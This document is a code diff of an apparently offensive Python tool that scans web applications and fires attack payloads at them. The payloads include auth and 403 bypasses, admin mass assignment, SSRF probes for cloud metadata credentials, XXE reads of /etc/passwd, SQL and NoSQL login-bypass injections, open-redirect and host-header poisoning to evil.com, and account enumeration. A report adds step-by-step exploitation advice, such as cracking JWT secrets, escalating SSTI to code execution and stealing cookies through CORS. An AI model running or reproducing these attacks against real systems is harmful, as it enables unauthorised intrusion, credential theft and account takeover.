-            if not seen[key].body_sample and ep.body_sample:
-                seen[key].body_sample = ep.body_sample
-
-    result = list(seen.values())
-
-    GOLD = {"AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC", "ADMIN", "GRAPHQL"}
-    def score(ep: Endpoint) -> int:
-        s = len(ep.tags)
-        s += sum(3 for t in ep.tags if t in GOLD)
-        if ep.status in (200, 201): s += 2
-        if ep.status == 403:        s += 1
-        return s
-
-    result.sort(key=score, reverse=True)
-    return result
+def _check_security_headers(ep: Endpoint, headers: Dict):
+    missing = []
+    if not headers.get("Content-Security-Policy") and not headers.get("X-Content-Security-Policy"):
+        missing.append("CSP")
+    if not headers.get("Strict-Transport-Security"):
+        missing.append("HSTS")
+    if not headers.get("X-Frame-Options") and "frame-ancestors" not in headers.get("Content-Security-Policy", ""):
+        missing.append("X-Frame-Options")
+    if not headers.get("X-Content-Type-Options"):
+        missing.append("X-Content-Type-Options")
+    if missing and ep.status == 200:
+        ep.notes.append(f"Missing security headers: {', '.join(missing)}")
+    # Info disclosure in headers
+    for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
+        v = headers.get(h, "")
+        if v:
+            ep.tags.add("INFO_DISC")
+            ep.notes.append(f"Header {h}: {v}")
 
 
-# ── Phase 5: Account enumeration probes ─────────────────────────────────────────────────────────
+# ── Exploit triage ────────────────────────────────────────────────────────────
 
-TEST_USERS = [
-    ("admin",    "x"), ("test",     "x"), ("user",     "x"),
-    ("root",     "x"), ("info",     "x"), ("support",  "x"),
-    ("noreply",  "x"),
-]
-NONEXISTENT = ("_no_such_user_zzz_", "x")
-
-
-async def phase_account_enum(http: HTTP, endpoints: list[Endpoint]):
-    hdr("PHASE 5 — ACCOUNT ENUMERATION PROBES")
-
-    auth_eps = [ep for ep in endpoints
-                if any(t in ep.tags for t in ("ACCOUNT_ENUM", "RATE_LIMIT", "JWT"))
-                and ep.path not in ("token", "refresh")]
-
-    if not auth_eps:
-        info("No login/register endpoints found to probe")
-        return
-
-    for ep in auth_eps[:5]:
-        path = ep.path
-        step(f"Probing account enumeration on /{path}")
-
-        t0 = time.monotonic()
-        s_nx, _, body_nx = await http.post(path,
-                                            body={"username": NONEXISTENT[0],
-                                                  "password": NONEXISTENT[1],
-                                                  "email": f"{NONEXISTENT[0]}@example.com"})
-        t_nx = time.monotonic() - t0
-
-        results = []
-        for username, password in TEST_USERS:
-            t0 = time.monotonic()
-            s, _, body = await http.post(path,
-                                          body={"username": username,
-                                                "password": password,
-                                                "email": f"{username}@example.com"})
-            elapsed = time.monotonic() - t0
-            results.append({"user": username, "status": s, "time": elapsed,
-                             "body_len": len(body), "body_sample": body[:120]})
-
-        nx_status = s_nx
-        nx_body   = body_nx[:120] if body_nx else ""
-
-        status_diffs = {r["user"] for r in results if r["status"] != nx_status}
-        body_diffs   = {r["user"] for r in results
-                        if abs(r["body_len"] - len(nx_body)) > 20}
-        timing_diffs = {r["user"] for r in results
-                        if r["time"] > t_nx * 1.5 and r["time"] - t_nx > 0.3}
-
-        if status_diffs:
-            crit(f"/{path} — STATUS CODE difference for users: {status_diffs}")
-            ep.tags.add("ACCOUNT_ENUM")
-            ep.notes.append(f"Status code oracle: {status_diffs} differ from nonexistent user")
-            for r in results:
-                if r["user"] in status_diffs:
-                    info(f"  {r['user']}: HTTP {r['status']}  (nonexist={nx_status})")
-
-        if body_diffs:
-            high(f"/{path} — RESPONSE BODY differs for users: {body_diffs}")
-            ep.tags.add("ACCOUNT_ENUM")
-            ep.notes.append(f"Body oracle: {body_diffs} return different body length")
-
-        if timing_diffs:
-            high(f"/{path} — TIMING difference for users: {timing_diffs}")
-            ep.tags.add("ACCOUNT_ENUM")
-            ep.notes.append(f"Timing oracle: {timing_diffs} respond slower (bcrypt hit?)")
-
-        for r in results:
-            for phrase in ("user not found", "no account", "invalid username",
-                           "email not registered", "account does not exist",
-                           "unknown user"):
-                if phrase in r["body_sample"].lower():
-                    crit(f"/{path} — VERBOSE ERROR for '{r['user']}': {phrase!r}")
-                    ep.tags.add("ACCOUNT_ENUM")
-                    ep.notes.append(f"Verbose error message: '{phrase}'")
-
-        step(f"Rate limit check on /{path} (10 rapid requests)")
-        tasks = [http.post(path, body={"username": "admin", "password": f"x{i}"})
-                 for i in range(10)]
-        rr = await asyncio.gather(*tasks)
-        statuses = [s for s, _, _ in rr]
-        if 429 in statuses:
-            ok(f"  Rate limiting active (429 detected)")
-        elif 200 in statuses[5:]:
-            warn(f"  No rate limiting — brute force possible")
-            ep.notes.append("No rate limit on login — brute force may be viable")
-        else:
-            info(f"  Statuses: {statuses[:5]}... (may have rate limiting)")
+async def triage_cors(http: HTTP, ep: Endpoint) -> None:
+    evil_origins = [
+        "https://evil.com",
+        "null",
+        f"https://evil.{extract_host(ep.url)}.com",
+    ]
+    for origin in evil_origins:
+        status, body, headers = await http.get(ep.url, headers={"Origin": origin})
+        acao = headers.get("Access-Control-Allow-Origin", "")
+        acac = headers.get("Access-Control-Allow-Credentials", "")
+        if not acao:
+            continue
+        if acao == origin or acao == "*":
+            ep.tags.add("CORS")
+            if acac.lower() == "true" and acao != "*":
+                ep.notes.append(f"CRITICAL CORS: Origin '{origin}' reflected with ACAC:true → XSH credential theft")
+                ep.tags.add("AUTH_BYPASS")
+            else:
+                ep.notes.append(f"CORS: Origin '{origin}' reflected (ACAC:{acac or 'false'})")
+            break
 
 
-# ── Phase 6: Auth boundary map ────────────────────────────────────────────────────────────────────
-
-async def phase_auth_map(http: HTTP, endpoints: list[Endpoint]):
-    hdr("PHASE 6 — AUTH BOUNDARY MAPPING")
-
-    candidate_tags = {"ADMIN", "IDOR", "MASS_ASSIGN", "BUSINESS_LOGIC", "FILE_OPS"}
-    candidates = [ep for ep in endpoints
-                  if ep.tags & candidate_tags and ep.status in (0, 200, 403)]
-
-    step(f"Testing {min(len(candidates), 30)} high-value endpoints without a token")
-
-    for ep in candidates[:30]:
-        s, hdrs, body, _ = await http.get(ep.path)
-        ep.status = s
-
-        if s in (200, 201):
+async def triage_auth_bypass(http: HTTP, ep: Endpoint) -> None:
+    tests = [
+        ({}, "no token"),
+        ({"Authorization": ""}, "empty token"),
+        ({"Authorization": "null"}, "null token"),
+        ({"Authorization": "Bearer undefined"}, "undefined token"),
+        ({"Authorization": "Bearer null"}, "Bearer null"),
+        ({"Authorization": "Bearer 0"}, "Bearer 0"),
+        ({"X-Original-URL": "/admin"}, "X-Original-URL override"),
+        ({"X-Rewrite-URL": "/admin"}, "X-Rewrite-URL override"),
+        ({"X-Override-URL": ep.url}, "X-Override-URL"),
+    ]
+    for hdrs, label in tests:
+        status, body, headers = await http.get(ep.url, headers=hdrs)
+        if status in (200, 201):
             ep.requires_auth = False
             ep.tags.add("AUTH_BYPASS")
-            crit(f"NO AUTH REQUIRED: /{ep.path}  [{', '.join(ep.tags)}]")
-        elif s == 401:
-            ep.requires_auth = True
-        elif s == 403:
-            ep.requires_auth = True
-            ep.notes.append("Returns 403 — try: different HTTP method, X-Original-URL header")
-        else:
+            ep.notes.append(f"Auth bypass: {label} → {status}")
+            return
+    # 403 bypass tricks
+    tricks = [
+        (ep.url + "/", "trailing slash"),
+        (ep.url + "/..", "dot-dot suffix"),
+        (ep.url + ";", "semicolon suffix"),
+        (ep.url + "%20", "encoded space"),
+        (ep.url + "?", "query string"),
+    ]
+    for url, label in tricks:
+        status, body, headers = await http.get(url)
+        if status in (200, 201):
             ep.requires_auth = False
+            ep.tags.add("AUTH_BYPASS")
+            ep.notes.append(f"403 bypass: {label} → {url}")
+            return
 
 
-# ── Phase 7: Verb enumeration ─────────────────────────────────────────────────────────────────────
-
-async def phase_verbs(http: HTTP, endpoints: list[Endpoint]):
-    hdr("PHASE 7 — HTTP VERB ENUMERATION")
-
-    gold_tags = {"ADMIN", "AUTH_BYPASS", "IDOR", "MASS_ASSIGN", "GRAPHQL"}
-    targets = [ep for ep in endpoints if ep.tags & gold_tags][:20]
-
-    for ep in targets:
-        s, allow_header = await http.options(ep.path)
-        if allow_header:
-            methods = [m.strip() for m in allow_header.split(",") if m.strip()]
-            ep.methods = methods
-            dangerous = [m for m in methods if m in ("PUT", "DELETE", "PATCH", "TRACE")]
-            if dangerous:
-                high(f"/{ep.path} — dangerous methods: {dangerous}  (Allow: {allow_header})")
-                ep.notes.append(f"Dangerous methods allowed: {dangerous}")
-                if "PUT" in dangerous or "PATCH" in dangerous:
-                    ep.tags.add("MASS_ASSIGN")
-                if "TRACE" in dangerous:
-                    ep.tags.add("INFO_DISC")
-                    ep.notes.append("TRACE enabled — XST (Cross-Site Tracing)")
-            else:
-                info(f"  /{ep.path}  Allow: {allow_header}")
+async def triage_verb_tamper(http: HTTP, ep: Endpoint) -> None:
+    dangerous = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
+    opts_status, _, opts_headers = await http.options(ep.url)
+    allow = opts_headers.get("Allow", opts_headers.get("Access-Control-Allow-Methods", ""))
+    if allow:
+        ep.notes.append(f"Allow: {allow}")
+        for v in dangerous:
+            if v in allow:
+                ep.tags.add("AUTH_BYPASS" if v in ("PUT", "DELETE", "PATCH") else "INFO_DISC")
+                ep.notes.append(f"Dangerous verb allowed: {v}")
+    if "TRACE" in allow:
+        ep.tags.add("INFO_DISC")
+        ep.notes.append("TRACE enabled → potential XST (Cross-Site Tracing)")
+    ep.methods = [m.strip() for m in allow.split(",") if m.strip()]
 
 
-# ── Final report ────────────────────────────────────────────────────────────────────────────
+async def triage_mass_assignment(http: HTTP, ep: Endpoint) -> None:
+    evil_payload = {
+        "role": "admin",
+        "is_admin": True,
+        "admin": True,
+        "balance": 999999,
+        "credits": 999999,
+        "permissions": ["admin", "superuser"],
+        "is_superuser": True,
+        "scope": "admin",
+    }
+    status, body, headers = await http.post(ep.url, json=evil_payload,
+                                             headers={"Content-Type": "application/json"})
+    if status in (200, 201) and body:
+        for key in ["admin", "role", "is_admin", "balance", "is_superuser", "permissions"]:
+            if key in body:
+                ep.tags.add("MASS_ASSIGN")
+                ep.notes.append(f"Mass assignment: field '{key}' reflected in response")
+                return
+    status, body, headers = await http.get(ep.url + "?_method=PUT",
+                                             headers={"Content-Type": "application/json"},)
 
-ATTACK_NEXT_STEPS: dict[str, list[str]] = {
-    "ACCOUNT_ENUM": [
-        "Enumerate valid usernames via status/body/timing oracle",
-        "Combine with password spray — use found usernames",
-        "Test forgot-password: 'email not found' vs silence",
-    ],
-    "IDOR": [
-        "Replace your ID with 1,2,3 or other users' IDs",
-        "UUID v1: predict timestamps (see advanced_techniques.py #7)",
-        "Try IDOR on POST/PUT: change owner_id or user_id in body",
-    ],
-    "AUTH_BYPASS": [
-        "Access endpoint directly — no token needed",
-        "Try HTTP verb tampering: GET protected, POST/PUT not",
-        "X-Original-URL / X-Rewrite-URL header path override",
-        "Add ?admin=true, &role=admin query params",
-    ],
-    "INFO_DISC": [
-        "Read exposed config / secrets / credentials",
-        "Check for DB creds, API keys, JWT secrets",
-        "Swagger/OpenAPI: extract all undocumented endpoints",
-    ],
-    "ADMIN": [
-        "BFLA: call admin endpoints with non-admin token",
-        "Mass assignment: PUT/PATCH with {role:'admin', balance:9999}",
-        "List/modify other users via admin API",
-    ],
-    "GRAPHQL": [
-        "Full introspection: dump all types/fields/mutations",
-        "Test unauthenticated queries for sensitive fields",
-        "IDOR via resolver: query {user(id:1)} → change id",
-        "Mutation abuse: createUser, deleteUser without auth check",
-    ],
-    "INJECTION": [
-        "SQLi: ' OR 1=1--, UNION SELECT, time-based blind",
-        "NoSQL: {\$gt:''}, {\$ne:'x'} in JSON body",
-        "SSTI: {{7*7}}, ${7*7} in string params",
-        "XSS: <script>alert(1)</script> in reflected params",
-    ],
-    "SSRF": [
-        "http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)",
+
+async def triage_jwt(ep: Endpoint) -> None:
+    auth_header = ep.response_headers.get("Authorization", "")
+    set_cookie = ep.response_headers.get("Set-Cookie", "")
+    # Check if token-related endpoint
+    if not any(t in ep.tags for t in ["JWT", "OAUTH"]):
+        return
+    ep.notes.append("JWT endpoint — test: alg:none, HS256→RS256 confusion, weak secret (secret123/password/jwt/changeme)")
+    ep.notes.append("Manual: copy token to jwt.io, change alg to 'none', remove signature")
+
+
+async def triage_rate_limit(http: HTTP, ep: Endpoint, login_fields: Optional[dict] = None) -> None:
+    payload = login_fields or {"username": "admin", "password": "password"}
+    tasks = [http.post(ep.url, json=payload) for _ in range(12)]
+    results = await asyncio.gather(*tasks)
+    statuses = [r[0] for r in results if r[0]]
+    if 429 in statuses:
+        ep.notes.append("Rate limit enforced (429 detected)")
+    elif len(set(statuses)) == 1 and statuses[0] in (200, 401):
+        ep.tags.add("RATE_LIMIT")
+        ep.notes.append(f"No rate limiting detected — all {len(statuses)} rapid requests returned {statuses[0]}")
+
+
+async def triage_account_enum(http: HTTP, base: str, ep: Endpoint) -> None:
+    NONEXIST = "_zzz_no_such_user_xqq_"
+    TEST_USERS = ["admin", "administrator", "test", "root", "info", "support",
+                  "noreply", "postmaster", "abuse", "security", "contact",
+                  "webmaster", "no-reply", "donotreply", "help", "user",
+                  "guest", "demo"]
+
+    baseline_s, baseline_b, _ = await http.post(ep.url,
+        json={"username": NONEXIST, "password": "wrongpass"},
+        headers={"Content-Type": "application/json"})
+    baseline_email_s, baseline_email_b, _ = await http.post(ep.url,
+        json={"email": f"{NONEXIST}@example.com", "password": "wrongpass"},
+        headers={"Content-Type": "application/json"})
+
+    oracle_phrases = re.compile(
+        r"(user\s+(not found|doesn.t exist|does not exist|invalid|unknown)|"
+        r"account\s+(not found|doesn.t exist|does not exist)|"
+        r"email\s+(not found|not registered|unknown|invalid)|"
+        r"no\s+account\s+found|invalid\s+email\s+address|"
+        r"that\s+email\s+address\s+(isn.t|is not)|"
+        r"we\s+couldn.t\s+find|username\s+not\s+found|"
+        r"incorrect\s+username|wrong\s+username)",
+        re.I
+    )
+
+    findings = []
+    for username in TEST_USERS[:6]:
+        t0 = time.time()
+        status, body, _ = await http.post(ep.url,
+            json={"username": username, "password": "wrongpass"},
+            headers={"Content-Type": "application/json"})
+        elapsed = time.time() - t0
+
+        if status != baseline_s:
+            findings.append(f"Status oracle: '{username}' → {status} (baseline:{baseline_s})")
+            ep.tags.add("ACCOUNT_ENUM")
+        if abs(len(body) - len(baseline_b)) > 25:
+            findings.append(f"Body-length oracle: '{username}' body={len(body)} baseline={len(baseline_b)}")
+            ep.tags.add("ACCOUNT_ENUM")
+        if oracle_phrases.search(body):
+            findings.append(f"Verbose error for '{username}': {oracle_phrases.search(body).group(0)}")
+            ep.tags.add("ACCOUNT_ENUM")
+
+    if findings:
+        ep.notes.extend(findings[:4])
+    elif any(oracle_phrases.search(b) for b in [baseline_b, baseline_email_b]):
+        ep.tags.add("ACCOUNT_ENUM")
+        ep.notes.append("Verbose user-not-found error on nonexistent account")
+
+
+async def triage_ssrf(http: HTTP, ep: Endpoint) -> None:
+    canary_payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://metadata.google.internal/computeMetadata/v1/",
-        "http://localhost:6379/ (Redis), http://localhost:27017/ (Mongo)",
-        "XXE-based SSRF: see advanced_techniques.py module 4",
-    ],
-    "JWT": [
-        "Decode token: base64 decode header+payload",
-        "alg:none — strip signature, change alg header to 'none'",
-        "Brute weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt",
-        "RS256→HS256 confusion if JWKS exposed (advanced_techniques.py #6)",
-    ],
-    "OAUTH": [
-        "Open redirect: redirect_uri=https://attacker.com",
-        "Missing state param: CSRF on OAuth flow",
-        "Password grant: grant_type=password bypasses MFA",
-        "See advanced_techniques.py module 10 for full OAuth suite",
-    ],
-    "CORS": [
-        "ACAC:true + reflected ACAO = credentialed cross-origin read",
-        "PoC: fetch from attacker.com with credentials:include",
-        "Can read authenticated API responses cross-origin",
-    ],
-    "MASS_ASSIGN": [
-        "PUT/PATCH body: add role, admin, is_admin, balance, credits",
-        'Try: {"role":"admin"} or {"is_admin":true}',
-    ],
-    "BUSINESS_LOGIC": [
-        "Negative quantities: {amount: -999} to credit balance",
-        "Race condition: parallel requests on one-time coupon/transfer",
-        "Integer overflow: amount=2147483648",
-    ],
-    "FILE_OPS": [
-        "Path traversal: ../../../etc/passwd",
-        "Upload: .php/.jsp webshell disguised as image/pdf",
-        "SSRF via URL field in upload endpoint",
-    ],
-    "OPEN_REDIRECT": [
-        "redirect=https://evil.com after login → phishing",
-        "Chain with OAuth: poison redirect_uri",
-        "XSS via javascript:alert(1) in redirect param",
-    ],
-    "RATE_LIMIT": [
-        "Try X-Forwarded-For rotation to bypass IP rate limiting",
-        "Cluster bomb: valid usernames × password list",
-        "Try null byte / encoding tricks in password field",
-    ],
+        "http://169.254.170.2/v2/credentials",  # ECS
+        "http://100.100.100.200/latest/meta-data/",  # Alibaba
+        "http://localhost:22",
+        "http://127.0.0.1:22",
+        "http://127.0.0.1:3306",
+        "dict://127.0.0.1:6379/info",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_*1%0d%0a",
+    ]
+    for payload in canary_payloads[:3]:
+        for param in ["url", "uri", "target", "redirect", "endpoint", "webhook", "src", "href", "ref"]:
+            status, body, _ = await http.get(ep.url, params={param: payload})
+            if status == 200 and any(s in body for s in ["ami-id", "meta-data", "computeMetadata", "root:", "ec2"]):
+                ep.tags.add("SSRF")
+                ep.notes.append(f"SSRF confirmed: ?{param}={payload[:60]} → metadata response")
+                return
+            if status not in (0, 400, 403, 404):
+                ep.tags.add("SSRF")
+                ep.notes.append(f"SSRF candidate: ?{param}={payload[:50]} → {status}")
+
+
+async def triage_open_redirect(http: HTTP, ep: Endpoint) -> None:
+    payloads = [
+        "https://evil.com",
+        "//evil.com",
+        "/\\evil.com",
+        "https:evil.com",
+        "https://evil.com%2F@legitimate.com",
+    ]
+    for param in ["redirect", "return", "next", "goto", "url", "target", "continue", "return_url", "success_url"]:
+        for payload in payloads[:2]:
+            status, body, headers = await http.get(ep.url + f"?{param}={payload}")
+            loc = headers.get("Location", "")
+            if "evil.com" in loc and status in (301, 302, 307, 308):
+                ep.tags.add("OPEN_REDIRECT")
+                ep.notes.append(f"Open redirect: ?{param}={payload} → {loc}")
+                return
+
+
+async def triage_host_header(http: HTTP, ep: Endpoint) -> None:
+    evils = {
+        "Host": "evil.com",
+        "X-Forwarded-Host": "evil.com",
+        "X-Host": "evil.com",
+        "X-Forwarded-Server": "evil.com",
+        "X-HTTP-Host-Override": "evil.com",
+        "Forwarded": "host=evil.com",
+    }
+    for h, v in evils.items():
+        status, body, headers = await http.get(ep.url, headers={h: v})
+        if "evil.com" in body:
+            ep.tags.add("HOST_HEADER")
+            ep.notes.append(f"Host header injection: {h}: {v} reflected in response")
+            return
+    # Password reset poisoning
+    if "reset" in ep.path.lower() or "password" in ep.path.lower() or "forgot" in ep.path.lower():
+        status, body, _ = await http.post(ep.url,
+            json={"email": "admin@example.com"},
+            headers={"Host": "evil.com", "Content-Type": "application/json"})
+        if "evil.com" in body:
+            ep.tags.add("HOST_HEADER")
+            ep.notes.append("Password reset poisoning: Host: evil.com reflected in reset link")
+
+
+async def triage_cache_poison(http: HTTP, ep: Endpoint) -> None:
+    unkeyed_headers = {
+        "X-Forwarded-Host": "evil.com",
+        "X-Forwarded-Scheme": "nothttps",
+        "X-Original-URL": "/evil",
+        "X-Rewrite-URL": "/evil",
+        "X-Forwarded-Prefix": "/evil",
+        "X-Host": "evil.com",
+    }
+    for h, v in unkeyed_headers.items():
+        status, body, headers = await http.get(ep.url, headers={h: v})
+        if v in body or (h == "X-Forwarded-Scheme" and "nothttps" in body):
+            ep.tags.add("CACHE_POISON")
+            ep.notes.append(f"Cache poison candidate: {h}: {v} reflected in response")
+            return
+
+
+async def triage_idor(http: HTTP, ep: Endpoint) -> None:
+    # Already has IDOR tag from path analysis; add next steps
+    if "IDOR" not in ep.tags:
+        return
+    # Try incrementing numeric IDs in path
+    for m in re.finditer(r"/(\d+)(?:/|$)", ep.path):
+        base_id = int(m.group(1))
+        for test_id in [1, 2, 3, base_id - 1, base_id + 1]:
+            if test_id <= 0:
+                continue
+            test_url = ep.url.replace(f"/{base_id}", f"/{test_id}", 1)
+            status, body, _ = await http.get(test_url)
+            if status in (200, 201):
+                ep.notes.append(f"IDOR: {test_url} → {status} (potential other-user data access)")
+                ep.requires_auth = False if status == 200 else ep.requires_auth
+                break
+
+
+async def triage_xxe(http: HTTP, ep: Endpoint) -> None:
+    if not any(t in ep.tags for t in ["XXE", "FILE_OPS"]):
+        return
+    xxe_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><data>&xxe;</data></root>"""
+    status, body, _ = await http.post(ep.url, data=xxe_payload,
+                                       headers={"Content-Type": "application/xml"})
+    if "root:" in body or "nobody:" in body or "daemon:" in body:
+        ep.tags.add("XXE")
+        ep.notes.append("XXE CONFIRMED: /etc/passwd content in response")
+    elif status in (200, 500):
+        ep.notes.append("XXE probe returned response — test manually with OOB SSRF entity")
+
+
+async def triage_sql_injection(http: HTTP, ep: Endpoint) -> None:
+    sqli_payloads = ["'", "''", "' OR '1'='1", "1 OR 1=1 --", "1' AND SLEEP(0)--"]
+    error_sigs = re.compile(
+        r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
+        r"Warning.*mysql_|syntax error|SQLSTATE|ODBC Driver|"
+        r"Microsoft OLE DB|Unclosed quotation|You have an error in your SQL)",
+        re.I
+    )
+    for payload in sqli_payloads[:2]:
+        for param in ["id", "user_id", "q", "search", "filter", "sort", "order"]:
+            status, body, _ = await http.get(ep.url, params={param: payload})
+            if error_sigs.search(body):
+                ep.tags.add("SQLI")
+                ep.notes.append(f"SQLi error: ?{param}={payload!r} → DB error signature")
+                return
+
+
+async def triage_nosql(http: HTTP, ep: Endpoint) -> None:
+    payloads = [
+        {"username": {"$gt": ""}, "password": {"$gt": ""}},
+        {"username": {"$ne": "x"}, "password": {"$ne": "x"}},
+        {"username": "admin", "password": {"$regex": ".*"}},
+    ]
+    for payload in payloads:
+        status, body, _ = await http.post(ep.url, json=payload,
+                                           headers={"Content-Type": "application/json"})
+        if status in (200, 201) and any(k in body.lower() for k in ["token", "auth", "success", "user"]):
+            ep.tags.add("NOSQL")
+            ep.notes.append(f"NoSQL injection bypass: {json.dumps(payload)[:80]} → {status}")
+            return
+
+
+# ── Auth boundary mapping ─────────────────────────────────────────────────────
+
+async def map_auth_boundary(http: HTTP, endpoints: List[Endpoint]) -> None:
+    high_value_tags = {"ADMIN", "IDOR", "INFO_DISC", "BUSINESS_LOGIC", "AUTH_BYPASS", "MASS_ASSIGN"}
+    targets = [ep for ep in endpoints if ep.tags & high_value_tags]
+
+    async def check_unauthed(ep: Endpoint):
+        status, body, _ = await http.get(ep.url)
+        if status in (200, 201, 204):
+            ep.requires_auth = False
+            ep.tags.add("AUTH_BYPASS")
+            ep.notes.append(f"Accessible without auth: {status}")
+        elif status == 403:
+            ep.requires_auth = True
+            ep.notes.append("Returns 403 — attempt bypass techniques")
+        elif status == 401:
+            ep.requires_auth = True
+
+    await asyncio.gather(*[check_unauthed(ep) for ep in targets])
+
+
+# ── Report ────────────────────────────────────────────────────────────────────
+
+TAG_COLOR = {
+    "AUTH_BYPASS": R, "ACCOUNT_ENUM": R, "ADMIN": R, "SQLI": R,
+    "SSTI": R, "XXE": R, "DESERIALIZATION": R, "HTTP_SMUGGLING": R,
+    "IDOR": Y, "INFO_DISC": Y, "SSRF": Y, "INJECTION": Y, "JWT": Y, "GRAPHQL": Y,
+    "CORS": M, "MASS_ASSIGN": M, "OPEN_REDIRECT": M, "PATH_TRAVERSAL": M,
+    "CACHE_POISON": B, "HOST_HEADER": B, "RACE_CONDITION": B, "NOSQL": B,
+    "OAUTH": C, "BUSINESS_LOGIC": C, "FILE_OPS": C, "RATE_LIMIT": G,
+    "CORS": M, "CSRF": DIM, "WEBSOCKET": DIM, "XSS": Y, "LDAP": Y,
+}
+
+NEXT_STEPS = {
+    "ACCOUNT_ENUM": "Probe with valid usernames; compare response status/body/timing for nonexistent vs valid accounts",
+    "IDOR": "Replace your ID with 1,2,3 or other users' IDs; try UUIDs from /users list; test without auth",
+    "AUTH_BYPASS": "Send request with no token / null token / altered token; try HTTP verb switching; path suffix tricks",
+    "ADMIN": "Access without auth or with low-priv token; check for full user list / config / delete endpoints",
+    "INFO_DISC": "Read sensitive config values; check for JWT secrets, DB creds, AWS keys in response",
+    "SQLI": "Test SLEEP/WAITFOR, UNION SELECT, error-based; use sqlmap with --risk=3 --level=5",
+    "SSTI": "Probe {{7*7}} {{config}} {{''.__class__}}; escalate to RCE via __mro__ → subprocess",
+    "XXE": "Test file:///etc/passwd and SSRF via http://169.254.169.254/; try OOB with Burp Collaborator",
+    "SSRF": "Try AWS metadata: 169.254.169.254; GCP metadata: metadata.google.internal; internal ports",
+    "CORS": "Build PoC XHR from evil.com; if ACAC:true + reflected origin → steal auth cookies/tokens",
+    "MASS_ASSIGN": "Add role/admin/balance fields to PUT/PATCH/POST body; check if reflected or applied",
+    "OPEN_REDIRECT": "Redirect to https://evil.com; use in phishing, OAuth redirect URI abuse",
+    "JWT": "Check alg:none bypass; brute secret with hashcat/jwt-cracker; try RS256→HS256 confusion",
+    "OAUTH": "Test missing state param (CSRF); test open redirect in redirect_uri; try client_credentials",
+    "GRAPHQL": "Run introspection; query for password/secret/ssn fields; test mutation privilege escalation",
+    "HOST_HEADER": "Inject X-Forwarded-Host: evil.com; test password reset link poisoning",
+    "CACHE_POISON": "Inject X-Forwarded-Host in unkeyed header; confirm with X-Cache: HIT on second request",
+    "RACE_CONDITION": "Send 20+ parallel requests simultaneously; target coupon/balance/transfer endpoints",
+    "NOSQL": "Send JSON operators: {\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}}",
+    "RATE_LIMIT": "Send rapid requests; test on login/OTP/reset endpoints for brute-force potential",
+    "DESERIALIZATION": "Send Java (\\xac\\xed) or Python pickle blobs; use ysoserial gadget chains",
+    "BUSINESS_LOGIC": "Test negative amounts; skip payment steps; apply coupon multiple times (race); modify prices",
+    "PATH_TRAVERSAL": "Try ../../etc/passwd; URL-encode: %2e%2e%2f; double-encode: %252e%252e%252f",
+    "FILE_OPS": "Test file upload bypass: double extension, null byte, MIME confusion, zip slip",
 }
 
 
-def print_report(endpoints: list[Endpoint], base: str,
-                 out_file: str | None = None):
-    hdr("FINAL REPORT — ENDPOINTS BY ATTACK RELEVANCE")
+def color_tag(t: str) -> str:
+    c = TAG_COLOR.get(t, W)
+    return f"{c}{t}{RST}"
 
-    by_tag: dict[str, list[Endpoint]] = defaultdict(list)
+
+def print_report(endpoints: List[Endpoint], tech: Set[str], passive_subdomains: List[str],
+                 sourcemap_secrets: List[str]) -> None:
+    by_tag: Dict[str, List[Endpoint]] = defaultdict(list)
     for ep in endpoints:
-        for tag in ep.tags:
-            by_tag[tag].append(ep)
+        for t in ep.tags:
+            by_tag[t].append(ep)
 
-    priority_order = [
-        "AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC",
-        "ADMIN", "GRAPHQL", "INJECTION", "SSRF", "JWT",
-        "OAUTH", "CORS", "MASS_ASSIGN", "BUSINESS_LOGIC",
-        "FILE_OPS", "OPEN_REDIRECT", "RATE_LIMIT",
-    ]
+    sorted_eps = sorted(endpoints, key=score, reverse=True)
 
-    total_exploitable = 0
-    report: dict = {"base": base, "endpoints": [], "by_attack_class": {}}
+    print(f"\n{BOLD}{'═'*70}{RST}")
+    print(f"{BOLD}{R}  ENDPOINT DISCOVERY RESULTS{RST}")
+    print(f"{BOLD}{'═'*70}{RST}\n")
 
-    for tag in priority_order:
-        eps = by_tag.get(tag, [])
+    if tech:
+        print(f"{B}[Technology]{RST} {', '.join(sorted(tech))}\n")
+
+    if passive_subdomains:
+        print(f"{B}[Subdomains via crt.sh]{RST}")
+        for s in sorted(set(passive_subdomains))[:30]:
+            print(f"  {DIM}{s}{RST}")
+        print()
+
+    if sourcemap_secrets:
+        print(f"{R}[Source Map Secrets]{RST}")
+        for s in sourcemap_secrets:
+            print(f"  {R}★{RST} {s}")
+        print()
+
+    # Stats
+    gold_count = sum(1 for ep in endpoints if ep.tags & GOLD)
+    unauthed = [ep for ep in endpoints if ep.requires_auth is False]
+    print(f"{W}Total endpoints discovered:{RST} {len(endpoints)}")
+    print(f"{R}High-value (GOLD tags):{RST} {gold_count}")
+    print(f"{R}Accessible without auth:{RST} {len(unauthed)}")
+    print(f"{W}Attack classes found:{RST} {', '.join(color_tag(t) for t in sorted(by_tag.keys()))}\n")
+
+    if unauthed:
+        print(f"\n{BOLD}{R}══ ACCESSIBLE WITHOUT AUTH ══{RST}")
+        for ep in sorted(unauthed, key=score, reverse=True):
+            _print_endpoint(ep)
+
+    # Print by attack class, gold first
+    printed_urls: Set[str] = set()
+    for tag in sorted(TAGS_ALL, key=lambda t: (0 if t in GOLD else 1 if t in SILVER else 2, t)):
+        eps = [ep for ep in by_tag.get(tag, []) if ep.url not in printed_urls]
         if not eps:
             continue
+        print(f"\n{BOLD}{TAG_COLOR.get(tag, W)}══ {tag} ══{RST}")
+        if tag in NEXT_STEPS:
+            print(f"  {DIM}How to exploit: {NEXT_STEPS[tag]}{RST}\n")
+        for ep in sorted(eps, key=score, reverse=True)[:15]:
+            _print_endpoint(ep)
+            printed_urls.add(ep.url)
 
-        c = RD if tag in ("AUTH_BYPASS","ACCOUNT_ENUM","IDOR","INFO_DISC","ADMIN") else YL
